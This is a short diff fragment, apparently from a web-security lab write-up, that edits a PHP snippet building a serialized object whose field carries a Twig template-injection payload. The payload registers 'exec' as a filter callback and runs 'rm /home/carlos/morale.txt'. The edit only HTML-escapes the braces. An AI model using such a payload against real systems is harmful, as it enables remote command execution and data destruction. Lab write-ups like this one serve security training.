@@ -1057,7 +1057,7 @@ class CustomTemplate {}
 class Blog {}
 $object = new CustomTemplate;
 $blog = new Blog;
-$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->desc = '&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")}}&#123;&#123;_self.env.getFilter("rm /home/carlos/morale.txt")}}';
 $blog->user = 'user';
 $object->template_file_path = $blog;
 ```
